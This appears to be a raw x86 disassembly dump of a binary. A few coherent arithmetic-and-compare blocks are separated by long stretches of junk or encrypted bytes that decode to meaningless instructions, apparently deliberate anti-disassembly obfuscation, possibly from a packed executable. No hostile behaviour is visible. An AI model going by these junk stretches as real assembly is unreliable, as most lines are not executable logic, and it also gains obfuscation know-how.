  403ab1:	add    edx,ecx
  403ab3:	imul   edx,edi
  403ab6:	mov    edi,DWORD PTR [ebp-0x8]
  403ab9:	jmp    0x403dbc
  403abe:	pop    ebp
  403abf:	cli    
  403ac0:	mov    bh,0xac
  403ac2:	jno    0x403a75
  403ac4:	gs dec ebx
  403ac6:	or     BYTE PTR [edi],dl
  403ac8:	scas   al,BYTE PTR es:[edi]
  403ac9:	loopne 0x403b46
  403acb:	test   ch,ch
  403acd:	shl    DWORD PTR [eax],0x10
  403ad0:	jle    0x403b50
  403ad2:	pop    eax
  403ad3:	jl     0x403b53
  403ad5:	jle    0x403b45
  403ad7:	neg    BYTE PTR [eax-0x5dc680b1]
  403add:	fwait
  403ade:	jmp    0x941c:0x543174e8
  403ae5:	xchg   ebx,eax
  403ae6:	add    al,0xbc
  403ae8:	in     al,0xda
  403aea:	dec    ebx
  403aeb:	cld    
  403aec:	jo     0x403a9e
  403aee:	test   al,0x5e
  403af0:	addr16 xchg ebp,eax
  403af2:	fwait
  403af3:	cmp    BYTE PTR [ebp+0x69462686],dl
  403af9:	or     esi,0xffffffb5
  403afc:	inc    ebx
  403afd:	call   0x9b71:0x49bfe8bf
  403b04:	pop    ss
  403b05:	push   ds
  403b06:	mov    esi,0xfecd5d0f
  403b0b:	push   esi
  403b0c:	dec    ecx
  403b0d:	out    0x76,eax
  403b0f:	xor    ch,bh
  403b11:	aam    0x7b
  403b13:	stos   BYTE PTR es:[edi],al
  403b14:	enter  0x4e92,0x26
  403b18:	dec    ebp
  403b19:	sub    eax,0x98f57deb
  403b1e:	fwait
  403b1f:	mov    edx,0xc03e9c26
  403b24:	push   ebp
  403b25:	stos   BYTE PTR es:[edi],al
  403b26:	sti    
  403b27:	scas   al,BYTE PTR es:[edi]
  403b28:	ret    
  403b29:	or     eax,0x67e43957
  403b2e:	pop    ebp
  403b2f:	lahf   
  403b30:	pop    ds
  403b31:	xchg   BYTE PTR [edi-0x6a3eefdb],bh
  403b37:	mov    bh,0xec
  403b39:	xor    ch,BYTE PTR [eiz*1+0xc958e1c]
  403b40:	repz pop esp
  403b42:	fldenv [esi+0x5fab1d2a]
  403b48:	shl    BYTE PTR [edi+edx*2-0x537bf10d],0xc0
  403b50:	jne    0x403b94
  403b52:	loop   0x403b9d
  403b54:	ficomp DWORD PTR [ebx-0x15f915a5]
  403b5a:	xchg   esi,eax
  403b5b:	pop    ebx
  403b5c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403b5d:	cmp    dh,ah
  403b5f:	mov    cl,0x5e
  403b61:	mov    edi,?
  403b63:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403b64:	mov    ebp,ebx
  403b66:	and    edi,edx
  403b68:	mov    esi,0xcdb6d9df
  403b6d:	hlt    
  403b6e:	or     eax,0x47e5153e
  403b73:	xor    bl,0x2f
  403b76:	in     eax,dx
  403b77:	ror    DWORD PTR [edx+0x5624988c],0x54
  403b7e:	(bad)  
  403b7f:	sbb    eax,0xdc1d7203
  403b84:	mov    ?,WORD PTR [ecx+0x51]
  403b87:	jmp    0x403b7a
  403b89:	ret    0x75d1
  403b8c:	(bad)  
  403b8d:	cdq    
  403b8e:	mov    ebp,0x26a0ab8b
  403b93:	and    eax,0x13672071
  403b98:	jmp    0x862b:0x3d87d777
  403b9f:	pop    ebp
  403ba0:	test   cl,0x42
  403ba3:	imul   edi,eax,0xf9db88b9
  403ba9:	or     ecx,0x1c
  403bac:	jmp    DWORD PTR [esi]
  403bae:	inc    edi
  403baf:	js     0x403ba2
  403bb1:	std    
  403bb2:	js     0x403bc5
  403bb4:	or     eax,0x636fec1c
  403bb9:	popf   
  403bba:	test   BYTE PTR [eax],0x7c
  403bbd:	pop    edi
  403bbe:	inc    ecx
  403bbf:	not    al
  403bc1:	mov    ah,0xb6
  403bc3:	sub    al,0x80
  403bc5:	push   0x60
  403bc7:	mov    ecx,eax
  403bc9:	call   0x300e:0xf1fc3449
  403bd0:	nop
  403bd1:	rol    ebx,cl
  403bd3:	nop
  403bd4:	ret    0x1875
  403bd7:	in     al,dx
  403bd8:	xchg   edx,eax
  403bd9:	jge    0x403bad
  403bdb:	fmul   st,st(1)
  403bdd:	add    eax,0xfc08d26c
  403be2:	ror    BYTE PTR [edi],0x69
  403be5:	daa    
  403be6:	push   0x47eb94be
  403beb:	sbb    DWORD PTR [ebx+eiz*4],eax
  403bee:	sbb    edx,0x7c475f75
  403bf4:	add    al,0x2f
  403bf6:	in     eax,0xe3
  403bf8:	adc    eax,0x9c4f07b1
  403bfd:	ins    BYTE PTR es:[edi],dx
  403bfe:	jno    0x403c1c
  403c00:	dec    ebx
  403c01:	pop    edx
  403c02:	cdq    
  403c03:	cdq    
  403c04:	outs   dx,BYTE PTR ds:[esi]
  403c05:	or     dl,BYTE PTR [eax+ecx*1]
  403c08:	sub    al,0x16
  403c0a:	dec    ebp
  403c0b:	fs test edx,edx
  403c0e:	cmp    DWORD PTR [ebx-0x36],esp
  403c11:	push   ebx
  403c12:	inc    esi
  403c13:	mov    al,ds:0x2cdc1e8e
  403c18:	mov    dl,0x75
  403c1a:	push   ebp
  403c1b:	rcr    DWORD PTR [bx+0x6b26],0x67
  403c21:	pushf  
  403c22:	xchg   BYTE PTR [esi-0x40],al
  403c25:	shl    eax,cl
  403c27:	hlt    
  403c28:	jmp    0xdca4ce27
  403c2d:	dec    ecx
  403c2e:	pop    esp
  403c2f:	sbb    edi,DWORD PTR [esi+0x3c]
  403c32:	or     bh,BYTE PTR [edi+eax*2]
  403c35:	push   ds
  403c36:	jmp    0x6e3a9bc7
  403c3b:	rcr    bh,1
  403c3d:	mov    ds:0xf63e575a,eax
  403c42:	inc    edx
  403c43:	mov    al,0x56
  403c45:	cmp    BYTE PTR [esi*1+0x13e9c94e],0xc8
  403c4d:	jne    0x403ccb
  403c4f:	test   eax,0xd0981625
  403c54:	lahf   
  403c55:	xor    BYTE PTR [ebp+0x6f47640e],cl
  403c5b:	outs   dx,BYTE PTR ds:[esi]
  403c5c:	jl     0x403c1d
  403c5e:	in     al,dx
  403c5f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403c60:	pop    ds
  403c61:	jno    0x403c27
  403c63:	inc    edi
  403c64:	pop    es
  403c65:	sbb    edx,DWORD PTR [ecx-0x62]
  403c68:	ins    DWORD PTR es:[edi],dx
  403c69:	(bad)  
  403c6a:	jmp    0xf5ef:0xb6d9891
  403c71:	gs adc al,0x82
  403c74:	lods   al,BYTE PTR ds:[esi]
  403c75:	xchg   ecx,eax
  403c76:	icebp  
  403c77:	ins    BYTE PTR es:[edi],dx
  403c78:	popa   
  403c79:	sbb    eax,0xe8f90462
  403c7e:	mov    esi,0x8938f4a9
  403c83:	push   edi
  403c84:	clc    
  403c85:	ds adc al,0x65
  403c88:	pop    edx
  403c89:	mov    cl,0x7f
  403c8b:	mov    ch,0xe
  403c8d:	and    BYTE PTR [esi-0x3aceb409],0xba
  403c94:	in     eax,dx
  403c95:	out    0xee,al
  403c97:	jne    0x403c71
  403c99:	xor    eax,0x7490189e
  403c9e:	test   BYTE PTR [esi],cl
  403ca0:	sub    eax,DWORD PTR [ebp+0x741fedd1]
  403ca6:	mov    DWORD PTR [ebx+0x431c70f7],esp
  403cac:	mov    DWORD PTR [edx+0x25],ebx
  403caf:	sbb    dh,BYTE PTR [ecx-0xbe3d573]
  403cb5:	and    al,0xef
  403cb7:	and    BYTE PTR [eax],dh
  403cb9:	hlt    
  403cba:	adc    al,BYTE PTR [ebp-0x55215eab]
  403cc0:	dec    eax
  403cc1:	inc    esi
  403cc2:	test   BYTE PTR [ebx+0x5177d66c],cl
  403cc8:	gs xchg ah,dh
  403ccb:	jge    0x403cc7
  403ccd:	loopne 0x403c6b
  403ccf:	pop    ss
  403cd0:	jnp    0x403c59
  403cd2:	dec    esi
  403cd3:	pop    es
  403cd4:	mov    ds:0x39885d0,al
  403cd9:	cmp    ebp,ecx
  403cdb:	push   es
  403cdc:	and    DWORD PTR [esi+0x2f],esp
  403cdf:	inc    esi
  403ce0:	jge    0x403cbd
  403ce2:	leave  
  403ce3:	cmp    DWORD PTR [ebx+0x62],ebp
  403ce6:	add    dl,BYTE PTR [ebx]
  403ce8:	daa    
  403ce9:	out    dx,eax
  403cea:	loopne 0x403cc0
  403cec:	fimul  DWORD PTR [edx+0x7]
  403cef:	fidivr DWORD PTR [ebx+edx*1]
  403cf2:	xlat   BYTE PTR ds:[ebx]
  403cf3:	out    0x64,al
  403cf5:	inc    ecx
  403cf6:	mov    ecx,0x5fa8dd58
  403cfb:	mov    cl,0x58
  403cfd:	ja     0x403d56
  403cff:	aas    
  403d00:	xchg   ecx,eax
  403d01:	mov    ebx,0xfbb9aa56
  403d06:	fnstcw WORD PTR [edi-0x3fbc9600]
  403d0c:	cmp    eax,0xf64ab9c9
  403d11:	mov    ds:0xfc0fa81d,eax
  403d16:	jbe    0x403ca4
  403d18:	xor    eax,0x79a48193
  403d1d:	push   edi
  403d1e:	inc    ebx
  403d1f:	call   0xbafb:0xc5d48ba8
  403d26:	hlt    
  403d27:	add    bl,ch
  403d29:	mov    ebp,0x5ad893b7
  403d2e:	mov    WORD PTR [ecx+ebp*4-0x3c3cb2a9],cs
  403d35:	inc    ebp
  403d36:	retf   0x9ce2
  403d39:	sbb    ebp,edx
  403d3b:	les    edi,FWORD PTR [esi]
  403d3d:	shl    DWORD PTR [ebp-0x3f],cl
  403d40:	mov    esp,0xcf6b948a
  403d45:	push   0xb7ec87ac
  403d4a:	mov    dl,0xb7
  403d4c:	mov    ds:0x817acb7a,eax
  403d51:	mov    ds:0xfa53d21f,eax
  403d56:	cmp    eax,0xa1489205
  403d5b:	les    edi,FWORD PTR [ecx+0x6f]
  403d5e:	(bad)  [esi+0xab3a398]
  403d64:	(bad)  
  403d65:	jnp    0x403d58
  403d67:	(bad)  
  403d68:	and    eax,0x7bd3bc45
  403d6d:	jo     0x403d17
  403d6f:	lds    ebx,FWORD PTR ds:0xb9a08f49
  403d75:	pusha  
  403d76:	add    eax,0xdd68e3fc
  403d7b:	and    eax,0x7ada7c0c
  403d80:	pop    es
  403d81:	dec    ecx
  403d82:	pop    edx
  403d83:	les    edx,FWORD PTR [esi-0x49]
  403d86:	pusha  
  403d87:	jo     0x403de5
  403d89:	bound  eax,QWORD PTR [ebp-0x65]
  403d8c:	ret    
  403d8d:	mov    WORD PTR [ecx+0x4322580b],gs
  403d93:	mov    BYTE PTR [ebx+0x4a242dcd],al
  403d99:	js     0x403d47
  403d9b:	shl    DWORD PTR [ebp+0x26],0xd4
  403d9f:	push   edx
  403da0:	int    0xa4
  403da2:	xor    al,0xf8
  403da4:	add    DWORD PTR [esp+ebp*8+0x5d77b080],0xac510c0b
  403daf:	test   BYTE PTR [esi-0x18],bl
  403db2:	xchg   edi,eax
  403db3:	and    esp,eax
  403db5:	jnp    0x403d82
  403db7:	rcl    DWORD PTR [eax+ebx*4+0x7d],0xd4
  403dbc:	mov    ebx,DWORD PTR [ebp-0x10]
  403dbf:	sub    ebx,edi
  403dc1:	cmp    ebx,edx
  403dc3:	ja     0x403dd1
  403dc9:	mov    edx,DWORD PTR [ebp-0x28]
  403dcc:	jmp    0x404176
  403dd1:	mov    edx,DWORD PTR [ebp-0x30]
  403dd4:	mov    edi,DWORD PTR [ebp-0x4]
  403dd7:	xor    edx,eax
  403dd9:	xor    edi,eax
  403ddb:	add    edi,ecx
  403ddd:	add    edx,ecx
  403ddf:	imul   edx,edi
  403de2:	mov    edi,DWORD PTR [ebp-0x8]
  403de5:	mov    ebx,DWORD PTR [ebp-0x10]
  403de8:	sub    ebx,edi
  403dea:	cmp    ebx,edx
  403dec:	ja     0x403dfa
  403df2:	mov    edx,DWORD PTR [ebp-0x2c]
  403df5:	jmp    0x404176
  403dfa:	mov    edx,DWORD PTR [ebp-0x34]
  403dfd:	mov    edi,DWORD PTR [ebp-0x4]
  403e00:	xor    edx,eax
  403e02:	xor    edi,eax
  403e04:	add    edi,ecx
  403e06:	add    edx,ecx
  403e08:	imul   edx,edi
  403e0b:	mov    edi,DWORD PTR [ebp-0x8]
  403e0e:	mov    ebx,DWORD PTR [ebp-0x10]
  403e11:	sub    ebx,edi
  403e13:	cmp    ebx,edx
  403e15:	ja     0x403e23
  403e1b:	mov    edx,DWORD PTR [ebp-0x30]
  403e1e:	jmp    0x404176
  403e23:	mov    edx,DWORD PTR [ebp-0x38]
  403e26:	mov    edi,DWORD PTR [ebp-0x4]
  403e29:	xor    edx,eax
  403e2b:	xor    edi,eax
  403e2d:	add    edi,ecx
  403e2f:	add    edx,ecx
  403e31:	imul   edx,edi
  403e34:	mov    edi,DWORD PTR [ebp-0x8]
  403e37:	mov    ebx,DWORD PTR [ebp-0x10]
  403e3a:	sub    ebx,edi
  403e3c:	cmp    ebx,edx
  403e3e:	ja     0x403e4c
  403e44:	mov    edx,DWORD PTR [ebp-0x34]
  403e47:	jmp    0x404176
  403e4c:	mov    edx,DWORD PTR [ebp-0x3c]
  403e4f:	mov    edi,DWORD PTR [ebp-0x4]
  403e52:	xor    edx,eax
  403e54:	xor    edi,eax
  403e56:	add    edx,ecx
  403e58:	add    edi,ecx
  403e5a:	imul   edx,edi
  403e5d:	mov    edi,DWORD PTR [ebp-0x8]
  403e60:	mov    ebx,DWORD PTR [ebp-0x10]
  403e63:	jmp    0x404166
  403e68:	mov    dh,0x45
  403e6a:	xchg   edi,eax
  403e6b:	xor    BYTE PTR [ebp+0x50],0xb1
  403e6f:	jno    0x403e18
  403e71:	(bad)  
  403e72:	cs push 0x1e
  403e75:	push   ebx
  403e76:	(bad)  
  403e77:	fmul   QWORD PTR [edx]
  403e79:	pop    ds
  403e7a:	jle    0x403efa
  403e7c:	pop    eax
  403e7d:	jl     0x403efd
  403e7f:	jle    0x403e9f
  403e81:	xchg   esi,eax
  403e82:	pushf  
  403e83:	gs inc edi
  403e85:	lods   al,BYTE PTR ds:[esi]
  403e86:	mov    bh,0xa
  403e88:	mov    eax,ds:0xe1c8eb24
  403e8d:	stos   DWORD PTR es:[edi],eax
  403e8e:	pop    esi
  403e8f:	xor    DWORD PTR [edi-0x1f],esp
  403e92:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403e93:	add    BYTE PTR [ebp+0x4f],0xd9
  403e97:	int3   
  403e98:	or     BYTE PTR [eax+0x2dad36a],dl
  403e9e:	shl    esi,1
  403ea0:	ja     0x403ee3
  403ea2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403ea3:	mov    BYTE PTR [edx-0x78],ah
  403ea6:	mov    bl,0x75
  403ea8:	out    0x5d,eax
  403eaa:	push   edx
  403eab:	popa   
  403eac:	shl    ch,1
  403eae:	push   ds
  403eaf:	jmp    0x403f2c
  403eb1:	sti    
  403eb2:	xor    ebx,ebx
  403eb4:	ret    
  403eb5:	jns    0x403f0d
  403eb7:	sub    esi,DWORD PTR [edx+eax*8]
  403eba:	test   DWORD PTR [ecx],edx
  403ebc:	pushf  
  403ebd:	js     0x403e97
  403ebf:	sub    DWORD PTR [ecx-0x52],eax
  403ec2:	inc    ebp
  403ec4:	or     ecx,DWORD PTR ss:[ebx-0x79991a59]
  403ecb:	or     al,0x93
  403ecd:	or     BYTE PTR [ebx+0x5f],dh
  403ed0:	shl    BYTE PTR [ecx-0x54],0x9b
  403ed4:	push   ecx
  403ed5:	mov    al,0x56
  403ed7:	mov    edi,eax
  403ed9:	and    esp,DWORD PTR [ebp+0x556f36cf]
  403edf:	xchg   esi,eax
  403ee0:	neg    BYTE PTR [ebx*4-0x1ad5b528]
  403ee7:	pusha  
  403ee8:	inc    eax
  403ee9:	or     ch,BYTE PTR [esi+0x2a98c6f1]
  403eef:	push   ebp
  403ef0:	neg    DWORD PTR [edx+0x1dfd2bf9]
  403ef6:	cli    
  403ef7:	shl    BYTE PTR [esi],0xbc
  403efa:	jns    0x403efa
  403efc:	mov    al,ds:0x5f7d5feb
  403f01:	adc    ch,BYTE PTR [ecx-0x70fd6391]
  403f07:	xchg   DWORD PTR [edi-0x6a],eax
  403f0a:	(bad)  
  403f0b:	mov    ah,0x97
  403f0d:	aaa    
  403f0e:	xor    bl,0x5f
  403f11:	jne    0x403ef3
  403f13:	xchg   DWORD PTR [esi],edx
  403f15:	inc    ebx
  403f16:	or     DWORD PTR [ebp+0x77],0x12326f83
  403f1d:	mov    WORD PTR [edx],ss
  403f1f:	ficomp DWORD PTR [esi+eiz*8]
  403f22:	adc    ecx,ecx
  403f24:	xor    al,0xf3
  403f26:	mov    dl,dh
  403f28:	clc    
  403f29:	push   cs
  403f2a:	cwde   
  403f2b:	or     eax,0xa7da11bf
  403f30:	popf   
  403f31:	stc    
  403f32:	inc    esp
  403f33:	and    BYTE PTR [ebx-0x17],ah
  403f36:	std    
  403f37:	pop    edi
  403f38:	enter  0xdbf5,0x71
  403f3c:	jl     0x403faa
  403f3e:	add    bh,BYTE PTR [eax-0x3d]
  403f41:	mov    edi,ecx
  403f43:	xlat   BYTE PTR ds:[ebx]
  403f45:	mov    ds:0xc30d9886,al
  403f4a:	add    al,0x8c
  403f4c:	addr16 retf 
  403f4e:	push   0x3e3b563b
  403f53:	inc    eax
  403f54:	push   ebp
  403f55:	test   al,0xf8
  403f57:	pop    ss
  403f58:	ret    0x1a77
  403f5b:	aaa    
  403f5c:	lock adc al,bl
  403f5f:	leave  
  403f60:	dec    edi
  403f61:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403f62:	add    al,BYTE PTR [ecx-0x1c]
  403f65:	iret   
  403f66:	retf   
  403f67:	ins    DWORD PTR es:[edi],dx
  403f68:	mov    bl,0xc9
  403f6a:	inc    ebp
  403f6b:	sub    eax,0xe7c8be33
  403f70:	daa    
  403f71:	jns    0x403f1a
  403f73:	shl    DWORD PTR [ebx-0x70526631],1
  403f79:	fimul  DWORD PTR [ebx-0x7a]
  403f7c:	and    edi,0x6263b10d
  403f82:	fdivr  DWORD PTR [edx+0x60]
  403f85:	iret   
  403f86:	scas   eax,DWORD PTR es:[edi]
  403f87:	neg    DWORD PTR [eax-0x618d7677]
  403f8d:	shl    BYTE PTR [ecx+0x34667bba],1
  403f93:	es push es
  403f95:	cmp    bh,0xa8
  403f98:	xchg   ebp,eax
  403f99:	sub    al,0x34
  403f9b:	out    0xfd,eax
  403f9d:	dec    eax
  403f9e:	push   edi
  403f9f:	jae    0x403f3c
  403fa1:	icebp  
  403fa2:	jo     0x403f65
  403fa4:	dec    esi
  403fa5:	fs das 
  403fa7:	jmp    0xa04b:0xffa68ca8
  403fae:	icebp  
  403faf:	lfs    eax,FWORD PTR [ecx]
  403fb2:	test   BYTE PTR [ebp-0x58],ah
  403fb5:	outs   dx,DWORD PTR ds:[si]
  403fb7:	or     BYTE PTR [ecx-0x37],dl
  403fba:	lds    ebx,FWORD PTR [ebx+eax*1]
  403fbd:	(bad)
  403fc1:	(bad)  
  403fc2:	out    0xa,al
  403fc4:	push   0xffffffe6
  403fc6:	imul   edi,ecx,0xffffffaf
  403fc9:	loope  0x403f63
  403fcb:	lods   al,BYTE PTR ds:[esi]
  403fcc:	xor    edx,DWORD PTR [esi]
  403fce:	push   edx
  403fcf:	sar    ecx,1
  403fd1:	pop    esi
  403fd2:	mov    WORD PTR [ebx],es
  403fd4:	and    eax,0x2b6d002a
  403fd9:	call   0x8dd322d5
  403fde:	dec    eax
  403fdf:	xchg   edi,eax
  403fe0:	jle    0x40404f
  403fe2:	nop
  403fe3:	std    
  403fe4:	or     bh,ch
  403fe6:	test   al,0xd4
  403fe8:	ficomp DWORD PTR [ebx]
  403fea:	dec    esp
  403feb:	xor    dh,BYTE PTR [ebx]
  403fed:	fild   DWORD PTR [edx+edi*8]
  403ff0:	repnz add eax,DWORD PTR [ebp-0x68]
  403ff4:	fld    TBYTE PTR [ebx-0x14cb0fd2]
  403ffa:	mov    edi,DWORD PTR [ebx+0x7a]
  403ffd:	or     DWORD PTR [bx+di],esp
  404000:	adc    DWORD PTR [ebp-0x9],esi
  404003:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404004:	dec    eax
  404005:	jl     0x403fe8
  404007:	xor    DWORD PTR [ebp-0x7c21de47],ebx
  40400d:	outs   dx,BYTE PTR ds:[esi]
  40400e:	mov    BYTE PTR [edx],ah
  404010:	shl    DWORD PTR [edi],1
  404012:	mov    esp,0xc82be5a9
  404017:	out    0x75,eax
  404019:	adc    BYTE PTR [edi],al
  40401b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40401c:	pop    eax
  40401d:	aam    0x9d
  40401f:	mov    eax,ds:0x88dd920d
  404024:	loope  0x40400d
  404026:	inc    ecx
  404027:	fsub   st,st(5)
  404029:	stos   DWORD PTR es:[edi],eax
  40402a:	and    BYTE PTR [ebx-0x37ab13e7],bh
  404030:	out    dx,eax
  404031:	sbb    ch,ah
  404033:	mul    DWORD PTR [esi-0x63fc37f0]
  404039:	aas    
  40403a:	cmp    eax,0x738329bf
  40403f:	mov    dl,0x81
  404041:	das    
  404042:	fcom   QWORD PTR [ebx+edx*4]
  404045:	push   esp
  404046:	stos   BYTE PTR es:[edi],al
  404047:	addr16 aad 0x6
  40404a:	cli    
  40404b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40404c:	mov    dh,0xa8
  40404e:	repnz hlt 
  404050:	dec    eax
  404051:	je     0x403fec
  404053:	fdivrp st(7),st
  404055:	retf   0x6a4b
  404058:	dec    edi
  404059:	lock in eax,0xac
  40405c:	out    dx,eax
  40405d:	jge    0x40400f
  40405f:	mov    ebx,DWORD PTR [edx+eiz*2]
  404062:	add    al,0xbf
  404064:	rep stos DWORD PTR es:[edi],eax
  404066:	fld    QWORD PTR [ecx-0x64]
  404069:	das    
  40406a:	and    ch,BYTE PTR [ebp-0x47]
  40406d:	or     eax,0xc1a168e2
  404072:	in     eax,dx
  404073:	add    al,0x37
  404075:	shl    BYTE PTR [ecx-0x56],1
  404078:	xor    edi,esi
  40407a:	jno    0x4040cb
  40407c:	pop    es
  40407d:	xchg   edi,eax
  40407e:	test   eax,0x797fe045
  404083:	jno    0x4040c1
  404085:	pop    ds
  404086:	cmp    BYTE PTR [esi+ecx*4+0x56],0xc5
  40408b:	jmp    0x4a:0xf4eac281
  404092:	mov    ds,edx
  404094:	mov    ebp,0xfa070449
  404099:	(bad)  
  40409b:	idiv   BYTE PTR [edi-0x5816438b]
  4040a1:	mov    ebp,0xf62a62a
  4040a6:	ret    
  4040a7:	scas   al,BYTE PTR es:[edi]
  4040a8:	jmp    0xea884758
  4040ad:	mov    cl,0x81
  4040af:	jnp    0x404096
  4040b1:	mov    ebp,0x4dced3ca
  4040b6:	pop    esp
  4040b7:	xchg   edi,eax
  4040b8:	adc    BYTE PTR [ecx-0x10],ah
  4040bb:	cmp    eax,0x30d2606d
  4040c0:	pop    esi
  4040c1:	xchg   esi,eax
  4040c2:	sbb    BYTE PTR [esi+0x7de560b2],ch
  4040c8:	clc    
  4040c9:	ss ins BYTE PTR es:[edi],dx
  4040cb:	gs push 0xdfbd0cd7
  4040d1:	dec    ebx
  4040d2:	add    BYTE PTR [edx+0x24b49f88],al
  4040d8:	je     0x40412f
  4040da:	push   ebx
  4040db:	mov    bl,0xba
  4040dd:	and    dh,al
  4040df:	jnp    0x404132
  4040e1:	push   esi
  4040e2:	adc    cl,bl
  4040e4:	mov    eax,0x961830e9
  4040e9:	inc    ecx
  4040ea:	mov    dh,0x30
  4040ec:	stos   DWORD PTR es:[edi],eax
  4040ed:	xor    dl,BYTE PTR [ebx+0x3ad500e1]
  4040f3:	lds    ebx,FWORD PTR [eax]
  4040f5:	cmp    dl,BYTE PTR [ecx+edi*2]
  4040f8:	mov    bl,0x76
  4040fa:	fidiv  WORD PTR [ebx+0x2ffa738f]
  404100:	(bad)  
  404101:	adc    eax,0x64bfc2cc
  404106:	mov    WORD PTR [eax+ecx*2-0x55],cs
  40410a:	scas   al,BYTE PTR es:[edi]
  40410b:	mov    ebx,DWORD PTR [ebx]
  40410d:	xchg   edx,eax
  40410e:	stos   BYTE PTR es:[edi],al
  40410f:	jmp    0x4040d5
  404111:	mov    eax,0x8db65520
  404116:	das    
  404117:	loope  0x404162
  404119:	push   eax
  40411a:	pop    ecx
  40411b:	cs cdq 
  40411d:	sub    eax,0x5a7a9c8f
  404122:	cmp    edi,DWORD PTR [ebp+ecx*2-0x2b992098]
  404129:	fbld   TBYTE PTR gs:[esi-0x7c]
  40412d:	rol    al,1
  40412f:	repnz jmp 0x54b3:0xf847ba4
  404137:	or     BYTE PTR [ebp+eiz*4-0x40736b18],0xcd
  40413f:	call   FWORD PTR [edi+esi*4-0x4e8e103e]
  404146:	mov    cl,0x61
  404148:	add    bl,BYTE PTR [edx+0x1]
  40414b:	iret   
  40414c:	je     0x4041b1
  40414e:	mov    bl,bh
  404150:	ja     0x4041b1
  404152:	adc    al,0x90
  404154:	(bad)  
  404155:	call   0x17c9cd8e
  40415a:	inc    edi
  40415b:	arpl   WORD PTR [edi],di
  40415d:	lds    edx,FWORD PTR [edx]
  40415f:	sub    ch,ch
  404161:	pop    eax
  404162:	and    eax,0x2b9ed714
  404167:	fistp  QWORD PTR [ebx]
  404169:	fimul  DWORD PTR [ebx-0x79f037ab]
  40416f:	add    eax,DWORD PTR [eax]
  404171:	add    BYTE PTR [eax],al
  404173:	mov    edx,DWORD PTR [ebp-0x3c]
  404176:	mov    edi,DWORD PTR [ebp-0x4]
  404179:	jmp    0x40447c
  40417e:	mov    al,0x3b
  404180:	aaa    
  404181:	or     BYTE PTR [ebp-0x10],dh
  404184:	mov    cl,0x63
  404186:	sub    DWORD PTR [edi],0xffffffd4
  404189:	xor    BYTE PTR [eax+0x74c7ced1],ah
  40418f:	sbb    eax,0x7c587e7e
  404194:	jle    0x404214
  404196:	ss jns 0x40415b
  404199:	mov    bl,0x60
  40419b:	hlt    
  40419c:	stos   BYTE PTR es:[edi],al
  40419d:	mov    edi,0xd0fc89d
  4041a2:	fcomp  DWORD PTR [eax-0x69ed55d1]
  4041a8:	cmp    al,BYTE PTR ds:0x515a52a6
  4041ae:	mov    DWORD PTR [esi-0x5084be12],esp
  4041b4:	push   ss
  4041b5:	sbb    eax,0xf73ef8ed
  4041ba:	xchg   esi,eax
  4041bb:	mov    bl,cl
  4041bd:	stos   DWORD PTR es:[edi],eax
  4041be:	(bad)  
  4041bf:	mov    ebp,0x95ea1df2
  4041c4:	pushf  
  4041c5:	push   ds
  4041c6:	push   eax
  4041c7:	fsubrp st(3),st
  4041c9:	or     edi,DWORD PTR [esi-0x721482b3]
  4041cf:	sbb    DWORD PTR [edi],0xffffffd4
  4041d2:	rol    bl,0x5d
  4041d5:	or     eax,0xfacf8eed
  4041da:	mov    ebp,0x7dd07a0c
  4041df:	sbb    bh,BYTE PTR [ecx-0x61]
  4041e2:	and    eax,DWORD PTR [eax+0x43]
  4041e5:	repnz mov ds:0x1fcfe701,eax
  4041eb:	int    0x94
  4041ed:	mov    ch,0x7f
  4041ef:	and    eax,0x1749ae9e
  4041f4:	inc    edi
  4041f5:	rcl    DWORD PTR [eax],1
  4041f7:	xor    al,0x34
  4041f9:	pop    ebp
  4041fa:	add    BYTE PTR [esi+eax*4-0x3e96e493],ah
  404201:	cld    
  404202:	mov    eax,ds:0x8ee7ecd5
  404207:	popf   
  404208:	aad    0x82
  40420a:	mov    DWORD PTR [edi+0x7fcf72ba],eax
  404210:	jnp    0x40423f
  404212:	jne    0x404279
  404214:	out    0x9d,eax
  404216:	gs mov esp,0x58be2b10
  40421c:	xchg   ecx,eax
  40421d:	arpl   WORD PTR [ebx-0x70f616f2],cx
  404223:	rcr    DWORD PTR [esi+0x3e1a16c4],cl
  404229:	out    0x48,al
  40422b:	push   ebx
  40422c:	ins    DWORD PTR es:[edi],dx
  40422d:	mov    ss,WORD PTR [ecx]
  40422f:	iret   
  404230:	jmp    0x40420c
  404232:	mov    eax,es:0xcecec044
  404238:	push   es
  404239:	ss jbe 0x4041ed
  40423c:	loop   0x404224
  40423e:	inc    ecx
  40423f:	push   ss
  404240:	push   ss
  404241:	cmp    BYTE PTR [eax+0x10694a24],cl
  404247:	add    DWORD PTR [edx],0xfc3d7e6b
  40424d:	xchg   esi,eax
  40424e:	inc    ebx
  40424f:	pop    esi
  404250:	add    al,0xf0
  404252:	inc    eax
  404253:	(bad)  
  404255:	jge    0x40423a
  404257:	mov    bl,0x88
  404259:	mov    ch,0xf4
  40425b:	jl     0x4041f4
  40425d:	test   DWORD PTR ds:0x132a6eae,ebx
  404263:	das    
  404264:	push   ebx
  404265:	push   eax
  404266:	mov    bl,0x6a
  404268:	jmp    FWORD PTR [esi+0xb373870]
  40426e:	repz add eax,0x20b3e925
  404274:	pop    ss
  404275:	jbe    0x404235
  404277:	ds jns 0x404267
  40427a:	das    
  40427b:	jmp    FWORD PTR [ebp-0x3993d3ab]
  404281:	les    ebp,FWORD PTR [ecx+eiz*1]
  404284:	mov    cl,0x8b
  404286:	daa    
  404287:	sub    ebp,DWORD PTR [ebp+0x2005e5cc]
  40428d:	clc    
  40428e:	sbb    edi,DWORD PTR [ebp-0x17]
  404291:	pop    ds
  404292:	iret   
  404293:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404294:	pop    esp
  404295:	ins    BYTE PTR es:[edi],dx
  404296:	arpl   WORD PTR [ebp+ebx*1-0x5],si
  40429a:	imul   DWORD PTR [ebp+0x7a794afa]
  4042a0:	into   
  4042a1:	adc    DWORD PTR [eax+0xf76e575],edi
  4042a7:	mov    eax,ds:0x3a513fdc
  4042ac:	xor    ch,BYTE PTR [eax+0x5b34a2fa]
  4042b2:	inc    esi
